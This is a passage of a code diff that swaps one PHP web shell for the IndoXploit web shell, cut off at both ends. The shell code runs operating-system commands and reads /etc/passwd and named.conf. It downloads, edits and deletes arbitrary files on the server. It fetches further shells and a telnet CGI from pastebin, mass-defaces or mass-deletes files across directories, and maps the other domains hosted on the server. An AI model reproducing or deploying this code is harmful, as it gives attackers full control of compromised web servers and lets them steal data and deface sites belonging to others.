-        <pre style="font-size:10px;"><code>'.htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8').'</code></pre>
-    </div>
-</div>';
-elseif(!$cmd && $_SERVER['REQUEST_METHOD'] == 'POST'):
-echo '<b>No results.</b>';endif;
-echo '
-</div>';
-}
-if(isset($_GET['phpinfo'])) {
-    @ob_start();
-    @eval("phpinfo();");
-    $buff = @ob_get_contents();
-    @ob_end_clean();    
-    $awal = strpos($buff,"<body>")+6;
-    $akhir = strpos($buff,"</body>");
-    echo "<b><pre class='php_info anu'>".substr($buff,$awal,$akhir-$awal)."</pre></b>";
+if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
+    @ob_clean();
+    $file = $_GET['file'];
+    header('Content-Description: File Transfer');
+    header('Content-Type: application/octet-stream');
+    header('Content-Disposition: attachment; filename="'.basename($file).'"');
+    header('Expires: 0');
+    header('Cache-Control: must-revalidate');
+    header('Pragma: public');
+    header('Content-Length: ' . filesize($file));
+    readfile($file);
     exit;
 }
-if(isset($_GET['upload'])) {
-echo "$_s";
-if(isset($_POST['upl'])){
-    $hasil = count($_FILES['file']['name']);
-    for($isi=0;$isi<$hasil;$isi++){
-        $namafile = $_FILES['file']['name'][$isi];
-            $up = @copy($_FILES['file']['tmp_name'][$isi],"$path/".$namafile);
-        }
-        if($hasil < 2){
-            if($up){
-            echo "<strong>Upload</strong> $namafile Ok! ".ok()."</div>";
-        }else{
-        echo '<strong>Upload</strong> fail! '.er().'</div>';
-        }
-    }else{
-    echo "<strong>Upload</strong> $hasil Ok! ".ok()."</div>";
-    }
-}
-echo "
-<div class='mb-3'>
-    <form method='POST' enctype='multipart/form-data'>
-        <div class='input-group mb-3'>
-            <input class='form-control form-control-sm' type='file' name='file[]' multiple='' $_r>
-            <input class='btn btn-outline-light btn-sm' type='submit' name='upl' value='UPLOAD'>
-        </div>
-    </form>
-</div>";
-}
-if(isset($_GET['filebaru'])) {
-echo "$_s";
-if(isset($_POST['bikin'])){
-    $name = $_POST['nama_file'];
-    $isi_file = $_POST['isi_file'];
-    foreach ($name as $nama_file){
-        $handle = @fopen("$nama_file", "w");
-        if($isi_file){
-            $buat = @fwrite($handle, $isi_file);
-        } else {
-            $buat = $handle;
-        }
-    }
-    if($buat){
-        echo "<script>window.location='?path=$path'</script>";
-    } else {
-        echo '<strong>Create file</strong> fail! '.er().'</div>';
-        }
-    }
-echo "
-<div class='mb-3'>
-    <form method='POST'>
-        <i class='bi bi-file-earmark'></i> Filename:
-        <input class='form-control form-control-sm' type='text' name='nama_file[]' placeholder='Filename' $_r>
-        <i class='bi bi-file-earmark'></i> File contents:
-        <textarea class='form-control form-control-sm' name='isi_file' rows='7' placeholder='File contents' $_r ></textarea>
-        <div class='d-grid gap-2'>
-            <input class='btn btn-outline-light btn-sm' type='submit' name='bikin' value='Submit'>
-        </div>
-    </form>
-</div>";
-}
-if(isset($_GET['dirbaru'])) {
-echo "$_s";
-if(isset($_POST['buat'])){
-    $nama = $_POST['nama_dir'];
-    foreach ($nama as $nama_dir){
-        $folder = preg_replace("([^\w\s\d\-_~,;:\[\]\(\].]|[\.]{2,})", '', $nama_dir);
-        $fd = @mkdir ($folder);
-    }
-    if($fd){
-        echo "<script>window.location='?path=$path'</script>";
-    } else {
-        echo '<strong>Make dir</strong> fail! '.er().'</div>';
-        }
-    }
-echo "
-<div class='mb-3'>
-    <form method='POST'>
-        <i class='bi bi-folder'></i> Dir name:
-        <div class='input-group mb-3'>
-            <input class='form-control form-control-sm' type='text' name='nama_dir[]' placeholder='Dir' $_r>
-            <input class='btn btn-outline-light btn-sm' type='submit' name='buat' value='Ok'>
-        </div>
-    </form>
-</div>";
-    }
-}
-// akhir tools
-if(isset($_GET['filesrc'])){
-echo "<br><b>name : </b>".basename($_GET['filesrc']);"</br>";
-echo '
-<div class="container-fluid language-javascript">
-    <div class="shell mb-3">
-        <pre style="font-size:12px;"><code>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</code></pre>
-    </div>
-</div>';
-} elseif(isset($_GET['option']) && $_POST['opt'] != 'hapus'){
-echo '<br><b>name : </b>'.basename($_POST['path']);'</br>';
-// file
-if($_POST['opt'] == 'ganti_nama'){
-if(isset($_POST['nama_baru'])){
-if(rename($_POST['path'],$path.'/'.$_POST['nama_baru'])){
-echo "<script>window.location='?path=$path'</script>";
-    } else {
-echo '<strong>Ok</strong> fail! '.er().'</div>';
-}
-$_POST['name'] = $_POST['nama_baru'];
-}
-echo '
-<form method="POST">
-    <div class="input-group mb-3">
-        <input class="form-control form-control-sm" name="nama_baru" type="text" value="'.$_POST['name'].'" />
-            <input type="hidden" name="path" value="'.$_POST['path'].'">
-        <input type="hidden" name="opt" value="ganti_nama">
-        <input class="btn btn-outline-light btn-sm" type="submit" value="Ok"/>
-    </div>
-</form>';
-} elseif($_POST['opt'] == 'edit'){
-if(isset($_POST['src'])){
-$fp = fopen($_POST['path'],'w');
-if(fwrite($fp,$_POST['src'])){
-echo '<strong>Edit</strong> Ok! '.ok().'</div>';
-    } else {
-echo '<strong>Edit</strong> fail! '.er().'</div>';
-}
-fclose($fp);
-}
-echo '
-<div class="mb-3">
-    <form method="POST">
-        <textarea class="form-control form-control-sm mb-3" rows="7" name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea>
-            <input type="hidden" name="path" value="'.$_POST['path'].'">
-            <input type="hidden" name="opt" value="edit">
-        <div class="d-grid gap-2">
-            <input class="btn btn-outline-light btn-sm" type="submit" value="Submit"/>
-        </div>
-    </form>
-</div>';
-    }
-} else {
-//hapus dir & file
-if(isset($_GET['option']) && $_POST['opt'] == 'hapus'){
-if($_POST['type'] == 'dir'){
-if(rmdir($_POST['path'])){
-    echo "<script>window.location='?path=$path'</script>";
-    } else {
-    echo '<strong>Delete</strong> fail! '.er().'</div>';
-    }
-} elseif($_POST['type'] == 'file'){
-if(unlink($_POST['path'])){
-    echo "<script>window.location='?path=$path'</script>";
-    } else {
-    echo '<strong>Delete files</strong> fail! '.er().'</div>';
-        }
-    }
-}
-$scandir = scandir($path);
-$pa = getcwd();
-echo '
-<div class="table-responsive">
-<table class="table table-hover table-dark text-light">
-<thead>
-<tr>
-    <td style="color:lime" class="text-center">NAME</td>
-        <td style="color:lime" class="text-center">LAST EDIT</td>
-        <td style="color:lime" class="text-center">SIZE</td>
-        <td style="color:lime" class="text-center">OWNER<gr>:</gr>DOWNER</td>
-        <td style="color:lime" class="text-center">PERMISSION</td>
-    <td style="color:lime" class="text-center">OPTION</td>
-</tr>
-</thead>
-<tbody class="text-nowrap">
-<tr>
-    <td><i class="bi bi-folder2-open"></i><a class="text-decoration-none text-secondary" href="?path='.dirname($dir).'">..</a></td><td></td><td></td><td></td><td></td><td class="text-center">
-        <div class="btn-group">
-            <a class="btn btn-outline-light btn-sm" href="?filebaru&path='.$dir.'"><i class="bi bi-file-earmark-plus-fill"></i></a>
-            <a class="btn btn-outline-light btn-sm" href="?dirbaru&path='.$dir.'"><i class="bi bi-folder-plus"></i></a>
-        </div>
-    </td>
-</tr>';
 
-foreach($scandir as $dir){
-    $dt = date("Y-m-d H:i:s", filemtime("$path/$dir"));
-    if(function_exists('posix_getpwuid')) {
-        $downer = @posix_getpwuid(fileowner("$path/$dir"));
-        $downer = $downer['name'];
-    } else {
-        $downer = fileowner("$path/$dir");
-    }
-    if(function_exists('posix_getgrgid')) {
-        $dgrp = @posix_getgrgid(filegroup("$path/$dir"));
-        $dgrp = $dgrp['name'];
-    } else {
-        $dgrp = filegroup("$path/$dir");
-    }
-if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
-echo "
-<tr>
-    <td><i class='bi bi-folder-fill'></i><a class='text-decoration-none text-secondary' href=\"?path=$path/$dir\">$dir</a></td>
-    <td class='text-center'>$dt</td>
-    <td class='text-center'>-</td>
-    <td class='text-center'>$downer<gr>:</gr>$dgrp</td>
-    <td class='text-center'>";
-if(is_writable("$path/$dir")) echo '<gr>';
-elseif(!is_readable("$path/$dir")) echo '<rd>';
-echo p("$path/$dir");
-if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</gr></rd></td>';
-echo "
-    <td class=\"text-center\">
-    <form method=\"POST\" action=\"?option&path=$path\">
-        <div class=\"btn-group\">
-            <button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"ganti_nama\"><i class='bi bi-pencil-fill'></i></button>
-            <button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"hapus\"><i class='bi bi-trash-fill'></i></button>
-        </div>
-        <input type=\"hidden\" name=\"type\" value=\"dir\">
-        <input type=\"hidden\" name=\"name\" value=\"$dir\">
-        <input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
-    </form>
-    </td>
-</tr>";
-}
-foreach($scandir as $file){
-    $ft = date("Y-m-d H:i:s", filemtime("$path/$file"));
-    if(!is_file($path.'/'.$file)) continue;
-    if(function_exists('posix_getpwuid')) {
-        $fowner = @posix_getpwuid(fileowner("$path/$file"));
-        $fowner = $fowner['name'];
-    } else {
-        $fowner = fileowner("$path/$file");
-    }
-    if(function_exists('posix_getgrgid')) {
-        $fgrp = @posix_getgrgid(filegroup("$path/$file"));
-        $fgrp = $fgrp['name'];
-    } else {
-        $fgrp = filegroup("$path/$file");
-    }
-echo "
-<tr>
-    <td><i class='bi bi-file-earmark-code-fill'></i><a class='text-decoration-none text-secondary' href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
-    <td class='text-center'>$ft</td>
-    <td class='text-center'>".sz(filesize($file))."</td>
-    <td class='text-center'>$fowner<gr>:</gr>$fgrp</td>
-    <td class='text-center'>";
-if(is_writable("$path/$file")) echo '<gr>';
-elseif(!is_readable("$path/$file")) echo '<rd>';
-echo p("$path/$file");
-if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</gr></rd></td>';
-echo "
-    <td class=\"text-center\">
-        <form method=\"POST\" action=\"?option&path=$path\">
-            <div class=\"btn-group\">
-                <button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"edit\"><i class='bi bi-pencil-square'></i></button>
-                <button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"ganti_nama\"><i class='bi bi-pencil-fill'></i></button>
-                <button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"download\"><i class='bi bi-download'></i></button>
-                <button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"hapus\"><i class='bi bi-trash-fill'></i></button>
-            </div>
-            <input type=\"hidden\" name=\"type\" value=\"file\">
-            <input type=\"hidden\" name=\"name\" value=\"$file\">
-            <input type=\"hidden\" name=\"path\" value=\"$path/$file\">
-        </form>
-    </td>
-</tr>";
-
-    }
+if(get_magic_quotes_gpc()) {
+	function idx_ss($array) {
+		return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
+	}
+	$_POST = idx_ss($_POST);
 }
 ?>
-</tbody>
-</table>
-<div class='text-secondary'>&copy; <?php echo " ".date('Y')." $_n";?></div>
-</div>
-</div>
+<!DOCTYPE HTML>
+<html>
+<!--
+###############################################################################
+// Thanks buat Orang-orang yg membantu dalam proses pembuatan shell ini.
+// Shell ini tidak sepenuhnya 100% Coding manual, ada beberapa function dan tools kita ambil dari shell yang sudah ada.
+// Tapi Selebihnya, itu hasil kreasi IndoXploit sendiri.
+// Tanpa kalian kita tidak akan BESAR seperti sekarang.
+// Greetz: All Member IndoXploit. & All My Friends.
+###############################################################################
+// Special Thanks: Depok Cyber Security | Sanjungan Jiwa | 0x1999
+###############################################################################
+-->
+<head>
+<title>IndoXploit</title>
+<meta name='author' content='IndoXploit'>
+<meta charset="UTF-8">
+<style type='text/css'>
+@import url(https://fonts.googleapis.com/css?family=Ubuntu);
+html {
+    background: #000000;
+	color: #ffffff;
+	font-size: 14px;
+	width: 100%;
+}
+
+li {
+	display: inline;
+	margin: 5px;
+	padding: 5px;
+}
+
+a {
+	color: #ffffff;
+	text-decoration: none;
+}
+
+a:hover {
+	color: gold;
+	text-decoration: underline;
+}
+
+b {
+	color: gold;
+}
+
+pre {
+	font-size: 13px;
+}
+
+table, th, td {
+	border-collapse:collapse;
+	background: transparent;
+	font-family: 'Ubuntu';
+	font-size: 13px;
+}
+
+.table_home, .th_home, .td_home {
+	border: 1px solid #ffffff;
+}
+
+.th_home {
+	color: lime;
+}
+
+.td_home, .td_home > a {
+	color: #ffffff;
+}
+
+.td_home > a:hover {
+	color: gold;
+}
+
+th {
+	padding: 10px;
+}
+
+tr:hover {
+	background: #006400;
+	color: #ffffff;
+}
+
+input[type=text], input[type=password], .input {
+	background: transparent; 
+	color: #ffffff;
+	border: 1px solid #ffffff;
+	padding: 3px;
+	font-family: 'Ubuntu';
+	font-size: 13px;
+}
+
+input[type=submit] {
+	padding: 2px;}
+
+input[type=submit]:hover {
+	cursor: pointer;
+}
+
+input:focus, textarea:focus {
+  outline: 0;
+  border-color: #ffffff;
+}
+
+textarea {
+	border: 1px solid #ffffff;
+	width: 100%;
+	height: 400px;
+	padding-left: 5px;
+	margin: 10px auto;
+	resize: none;
+	background: transparent;
+	color: #ffffff;
+	font-family: 'Ubuntu';
+	font-size: 13px;
+}
+iframe {
+	width: 100%;
+	min-height: 500px;
+}
+</style>
+</head>
+<body>
+<?php
+function path() {
+	if(isset($_GET['dir'])) {
+		$dir = str_replace("\\", "/", $_GET['dir']);
+		@chdir($dir);
+	} else {
+		$dir = str_replace("\\", "/", getcwd());
+	}
+	return $dir;
+}
+
+function color($bold = 1, $colorid = null, $string = null) {
+		$color = array(
+			"</font>",  			# 0 off
+			"<font color='red'>",	# 1 red 
+			"<font color='lime'>",	# 2 lime
+			"<font color='white'>",	# 3 white
+			"<font color='gold'>",	# 4 gold
+		);
+
+	return ($string !== null) ? $color[$colorid].$string.$color[0]: $color[$colorid];
+}
+
+function OS() {
+	return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
+}
+
+function exe($cmd) {
+	if(function_exists('system')) { 		
+		@ob_start(); 		
+		@system($cmd); 		
+		$buff = @ob_get_contents(); 		
+		@ob_end_clean(); 		
+		return $buff; 	
+	} elseif(function_exists('exec')) { 		
+		@exec($cmd,$results); 		
+		$buff = ""; 		
+		foreach($results as $result) { 			
+			$buff .= $result; 		
+		} return $buff; 	
+	} elseif(function_exists('passthru')) { 		
+		@ob_start(); 		
+		@passthru($cmd); 		
+		$buff = @ob_get_contents(); 		
+		@ob_end_clean(); 		
+		return $buff; 	
+	} elseif(function_exists('shell_exec')) { 		
+		$buff = @shell_exec($cmd); 		
+		return $buff; 	
+	} 
+}
+
+function save($filename, $mode, $file) {
+	$handle = fopen($filename, $mode);
+	fwrite($handle, $file);
+	fclose($handle);
+	return;
+}
+
+function getfile($name) {
+	if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't spawn $name."));
+	if($name === "adminer") $get = array("https://www.adminer.org/static/download/4.3.1/adminer-4.3.1.php", "adminer.php");
+	elseif($name === "webconsole") $get = array("https://pastebin.com/raw/2i96fDCN", "webconsole.php");
+	elseif($name === "cgitelnet1") $get = array("https://pastebin.com/raw/Lj46KxFT", "idx_cgi/cgitelnet1.idx");
+	elseif($name === "cgitelnet2") $get = array("https://pastebin.com/raw/aKL2QWfS", "idx_cgi/cgitelnet2.idx");
+
+	$fp = fopen($get[1], "w");
+	$ch = curl_init();
+	 	  curl_setopt($ch, CURLOPT_URL, $get[0]);
+	 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
+	 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+	 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+	 	  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+	   	  curl_setopt($ch, CURLOPT_FILE, $fp);
+	return curl_exec($ch);
+	   	  curl_close($ch);
+	fclose($fp);
+	ob_flush();
+	flush();
+}
+
+function usergroup() {
+	if(!function_exists('posix_getegid')) {
+		$user['name'] 	= @get_current_user();
+		$user['uid']  	= @getmyuid();
+		$user['gid']  	= @getmygid();
+		$user['group']	= "?";
+	} else {
+		$user['uid'] 	= @posix_getpwuid(posix_geteuid());
+		$user['gid'] 	= @posix_getgrgid(posix_getegid());
+		$user['name'] 	= $user['uid']['name'];
+		$user['uid'] 	= $user['uid']['uid'];
+		$user['group'] 	= $user['gid']['name'];
+		$user['gid'] 	= $user['gid']['gid'];
+	}
+	return (object) $user;
+}
+
+function getuser() {
+	$fopen = fopen("/etc/passwd", "r") or die(color(1, 1, "Can't read /etc/passwd"));
+	while($read = fgets($fopen)) {
+		preg_match_all('/(.*?):x:/', $read, $getuser);
+		$user[] = $getuser[1][0];
+	}
+	return $user;
+}
+
+function getdomainname() {
+	$fopen = fopen("/etc/named.conf", "r");
+	while($read = fgets($fopen)) {
+		preg_match_all("#/var/named/(.*?).db#", $read, $getdomain);
+		$domain[] = $getdomain[1][0];
+	}
+	return $domain;
+}
+
+function hddsize($size) {
+	if($size >= 1073741824)
+		return sprintf('%1.2f',$size / 1073741824 ).' GB';
+	elseif($size >= 1048576)
+		return sprintf('%1.2f',$size / 1048576 ) .' MB';
+	elseif($size >= 1024)
+		return sprintf('%1.2f',$size / 1024 ) .' KB';
+	else
+		return $size .' B';
+}
+
+function hdd() {
+	$hdd['size'] = hddsize(disk_total_space("/"));
+	$hdd['free'] = hddsize(disk_free_space("/"));
+	$hdd['used'] = $hdd['size'] - $hdd['free'];
+	return (object) $hdd;
+}
+
+function writeable($path, $perms) {
+	return (!is_writable($path)) ? color(1, 1, $perms) : color(1, 2, $perms);
+}
+
+function perms($path) {
+	$perms = fileperms($path);
+	if (($perms & 0xC000) == 0xC000) {
+		// Socket
+		$info = 's';
+	} 
+	elseif (($perms & 0xA000) == 0xA000) {
+		// Symbolic Link
+		$info = 'l';
+	} 
+	elseif (($perms & 0x8000) == 0x8000) {
+		// Regular
+		$info = '-';
+	} 
+	elseif (($perms & 0x6000) == 0x6000) {
+		// Block special
+		$info = 'b';
+	} 
+	elseif (($perms & 0x4000) == 0x4000) {
+		// Directory
+		$info = 'd';
+	} 
+	elseif (($perms & 0x2000) == 0x2000) {
+		// Character special
+		$info = 'c';
+	} 
+	elseif (($perms & 0x1000) == 0x1000) {
+		// FIFO pipe
+		$info = 'p';
+	} 
+	else {
+		// Unknown
+		$info = 'u';
+	}
+		// Owner
+	$info .= (($perms & 0x0100) ? 'r' : '-');
+	$info .= (($perms & 0x0080) ? 'w' : '-');
+	$info .= (($perms & 0x0040) ?
+	(($perms & 0x0800) ? 's' : 'x' ) :
+	(($perms & 0x0800) ? 'S' : '-'));
+	// Group
+	$info .= (($perms & 0x0020) ? 'r' : '-');
+	$info .= (($perms & 0x0010) ? 'w' : '-');
+	$info .= (($perms & 0x0008) ?
+	(($perms & 0x0400) ? 's' : 'x' ) :
+	(($perms & 0x0400) ? 'S' : '-'));
+	// World
+	$info .= (($perms & 0x0004) ? 'r' : '-');
+	$info .= (($perms & 0x0002) ? 'w' : '-');
+	$info .= (($perms & 0x0001) ?
+	(($perms & 0x0200) ? 't' : 'x' ) :
+	(($perms & 0x0200) ? 'T' : '-'));
+
+	return $info;
+}
+
+function lib_installed() {
+	$lib[] = "MySQL: ".(function_exists('mysql_connect') ? color(1, 2, "ON") : color(1, 1, "OFF"));
+	$lib[] = "cURL: ".(function_exists('curl_version') ? color(1, 2, "ON") : color(1, 1, "OFF"));
+	$lib[] = "WGET: ".(exe('wget --help') ? color(1, 2, "ON") : color(1, 1, "OFF"));
+	$lib[] = "Perl: ".(exe('perl --help') ? color(1, 2, "ON") : color(1, 1, "OFF"));
+	$lib[] = "Python: ".(exe('python --help') ? color(1, 2, "ON") : color(1, 1, "OFF"));
+	return implode(" | ", $lib);
+}
+
+function pwd() {
+	$dir = explode("/", path());
+	foreach($dir as $key => $index) {
+		print "<a href='?dir=";
+		for($i = 0; $i <= $key; $i++) {
+			print $dir[$i];
+			if($i != $key) {
+			print "/";
+			}
+		}
+		print "'>$index</a>/";
+	}
+	print "<br>";
+	print (OS() === "Windows") ? windisk() : "";
+}
+
+function windisk() {
+	$letters = "";
+	$v = explode("\\", path());
+	$v = $v[0];
+	 foreach(range("A", "Z") as $letter) {
+	  	$bool = $isdiskette = in_array($letter, array("A"));
+	  	if(!$bool) $bool = is_dir("$letter:\\");
+	  	if($bool) {
+	   		$letters .= "[ <a href='?dir=$letter:\\'".($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"":"").">";
+	   		if($letter.":" != $v) {
+	   			$letters .= $letter;
+	   		}
+	   		else {
+	   			$letters .= color(1, 2, $letter);
+	   		}
+	   		$letters .= "</a> ]";
+	  	}
+	}
+	if(!empty($letters)) {
+		print "Detected Drives $letters<br>";
+	}
+	if(count($quicklaunch) > 0) {
+		foreach($quicklaunch as $item) {
+	  		$v = realpath(path(). "..");
+	  		if(empty($v)) {
+	  			$a = explode(DIRECTORY_SEPARATOR,path());
+	  			unset($a[count($a)-2]);
+	  			$v = join(DIRECTORY_SEPARATOR, $a);
+	  		}
+	  		print "<a href='".$item[1]."'>".$item[0]."</a>";
+		}
+	}
+}
+
+function serverinfo() {
+	$disable_functions = @ini_get('disable_functions');
+	$disable_functions = (!empty($disable_functions)) ? color(1, 1, $disable_functions) : color(1, 2, "NONE");
+
+	$output[] = "SERVER IP ".color(1, 2, $GLOBALS['SERVERIP'])." / YOUR IP ".color(1, 2, $_SERVER['REMOTE_ADDR']);
+	$output[] = "WEB SERVER  : ".color(1, 2, $_SERVER['SERVER_SOFTWARE']);
+	$output[] = "SYSTEM      : ".color(1, 2, php_uname());
+	$output[] = "USER / GROUP: ".color(1, 2, usergroup()->name)."(".color(1, 2 , usergroup()->uid).") / ".color(1, 2 , usergroup()->group)."(".color(1, 2 , usergroup()->gid).")";
+	$output[] = "HDD         : ".color(1, 2, hdd()->used)." / ".color(1, 2 , hdd()->size)." (Free: ".color(1, 2 , hdd()->free).")";
+	$output[] = "PHP VERSION : ".color(1, 2, @phpversion());
+	$output[] = "SAFE MODE   : ".(@ini_get(strtoupper("safe_mode")) === "ON" ? color(1, 2, "ON") : color(1, 2, "OFF"));
+	$output[] = "DISABLE FUNC: $disable_functions";
+	$output[] = lib_installed();
+	$output[] = "Current Dir (".writeable(path(), perms(path())).") ";
+
+	print "<pre>";
+	print implode("<br>", $output);
+	pwd();
+	print "</pre>";
+
+}
+
+function curl($url, $post = false, $data = null) {
+    $ch = curl_init($url);
+    	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    	  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    	  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    	  curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    	  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
+    if($post) {
+    	  curl_setopt($ch, CURLOPT_POST, true);
+    	  curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    }
+    $curl['exec'] = curl_exec($ch);
+	$curl['info'] = curl_getinfo($ch);
+
+	return [
+		"info" 		=> $curl['info'],
+		"response" 	=> $curl['exec']
+	];
+
+		  curl_close($ch);
+}
+
+function reverse() {
+	$response = curl("http://domains.yougetsignal.com/domains.php", TRUE, "remoteAddress=".$GLOBALS['SERVERIP']."&ket=")['response'];
+	$response = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $response)))))))))))));
+	$explode  = explode(",,", $response);
+	unset($explode[0]);
+
+	foreach($explode as $domain) {
+		$domain = "http://$domain";
+		$domain = str_replace(",", "", $domain);
+		$url[] 	= $domain;
+		ob_flush();
+		flush();
+	}
+
+	return $url;
+}
+
+function getValue($param, $kata1, $kata2){
+    if(strpos($param, $kata1) === FALSE) return FALSE;
+    if(strpos($param, $kata2) === FALSE) return FALSE;
+    $start 	= strpos($param, $kata1) + strlen($kata1);
+    $end 	= strpos($param, $kata2, $start);
+    $return = substr($param, $start, $end - $start);
+    return $return;
+}
+
+function massdeface($dir, $file, $filename, $type = null) {
+	$scandir = scandir($dir);
+	foreach($scandir as $dir_) {
+		$path     = "$dir/$dir_";
+		$location = "$path/$filename";
+		if($dir_ === "." || $dir_ === "..") {
+			file_put_contents($location, $file);
+		}
+		else {
+			if(is_dir($path) AND is_writable($path)) {
+				print "[".color(1, 2, "DONE")."] ".color(1, 4, $location)."<br>";
+				file_put_contents($location, $file);
+				if($type === "-alldir") {
+					massdeface($path, $file, $filename, "-alldir");
+				}
+			}
+		}
+	}
+}
+
+function massdelete($dir, $filename) {
+	$scandir = scandir($dir);
+	foreach($scandir as $dir_) {
+		$path     = "$dir/$dir_";
+		$location = "$path/$filename";
+		if($dir_ === '.') {
+			if(file_exists("$dir/$filename")) {
+				unlink("$dir/$filename");
+			}
+		} 
+		elseif($dir_ === '..') {
+			if(file_exists(dirname($dir)."/$filename")) {
+				unlink(dirname($dir)."/$filename");
+			}
+		} 
+		else {
+			if(is_dir($path) AND is_writable($path)) {
+				if(file_exists($location)) {
+					print "[".color(1, 2, "DELETED")."] ".color(1, 4, $location)."<br>";
+					unlink($location);
+					massdelete($path, $filename);
+				}
+			}
+		}
+	}
+}
+
+function tools($toolsname, $args = null) {
+	if($toolsname === "cmd") {
+		print "<form method='post' action='?do=cmd&dir=".path()."' style='margin-top: 15px;'>
+			  ".usergroup()->name."@".$GLOBALS['SERVERIP'].": ~ $
+			  <input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='cmd' required>
+			  <input style='border: none; border-bottom: 1px solid #ffffff;' class='input' type='submit' value='>>'>
+			  </form>";
+	}
+	elseif($toolsname === "readfile") {
+		if(empty($args)) die(color(1, 1, $msg));
+		if(!is_file($args)) die(color(1, 1, "File '$args' is not exists."));
+
+		print "<pre>";
+		print htmlspecialchars(file_get_contents($args));
+		print "</pre>";
+	}
+	elseif($toolsname === "spawn") {
+		if($args === "adminer") {
+			if(file_exists("adminer.php")) {
+				print "Login Adminer: <a href='".$GLOBALS['FILEPATH']."/adminer.php' target='_blank'>http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/adminer.php</a>";
+			}
+			else {
+				if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create file 'Adminer'."));
+				if(getfile("adminer")) {
+					print "Login Adminer: <a href='".$GLOBALS['FILEPATH']."/adminer.php' target='_blank'>http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/adminer.php</a>";
+				}
+				else {
+					print color(1, 1, "Error while downloading file Adminer.");
+					@unlink("adminer.php");
+				}
+			}
+		}
+		elseif($args === "webconsole") {
+			if(file_exists("webconsole.php")) {
+				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/webconsole.php' frameborder='0' scrolling='yes'></iframe>";
+			}
+			else {
+				if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create file 'WebConsole'."));
+				if(getfile("webconsole")) {
+					print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/webconsole.php' frameborder='0' scrolling='yes'></iframe>";
+				}
+				else {
+					print color(1, 1, "Error while downloading file WebConsole.");
+					@unlink("webconsole.php");
+				}
+			}
+		}
+		elseif($args === "cgitelnet1") {
+			if(file_exists("idx_cgi/cgitelnet1.idx")) {
+				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_cgi/cgitelnet1.idx' frameborder='0' scrolling='yes'></iframe>";
+			}
+			elseif(file_exists('cgitelnet1.idx')) {
+				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/cgitelnet1.idx' frameborder='0' scrolling='yes'></iframe>";
+			}
+			else {
+				if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'idx_cgi'."));
+				if(!is_dir(path()."/idx_cgi/")) {
+					@mkdir('idx_cgi', 0755);
+					save("idx_cgi/.htaccess", "w", "AddHandler cgi-script .idx");
+				}
+				if(getfile("cgitelnet1")) {
+					chmod('idx_cgi/cgitelnet1.idx', 0755);
+					print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_cgi/cgitelnet1.idx' frameborder='0' scrolling='yes'></iframe>";
+				}
+				else {
+					print color(1, 1, "Error while downloading file CGI Telnet.");
+					@rmdir(path()."/idx_cgi/");
+					if(!@rmdir(path()."/idx_cgi/") AND OS() === "Linux") @exe("rm -rf ".path()."/idx_cgi/");
+					if(!@rmdir(path()."/idx_cgi/") AND OS() === "Windows") @exe("rmdir /s /q ".path()."/idx_cgi/");
+				}
+			}
+	
+		}
+		elseif($args === "cgitelnet2") {
+			if(file_exists("idx_cgi/cgitelnet2.idx")) {
+				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_cgi/cgitelnet2.idx' frameborder='0' scrolling='yes'></iframe>";
+			}
+			elseif(file_exists('cgitelnet2.idx')) {
+				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/cgitelnet2.idx' frameborder='0' scrolling='no'></iframe>";
+			}
+			else {
+				if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'idx_cgi'."));
+				if(!is_dir(path()."/idx_cgi/")) {
+					@mkdir('idx_cgi', 0755);
+					save("idx_cgi/.htaccess", "w", "AddHandler cgi-script .idx");
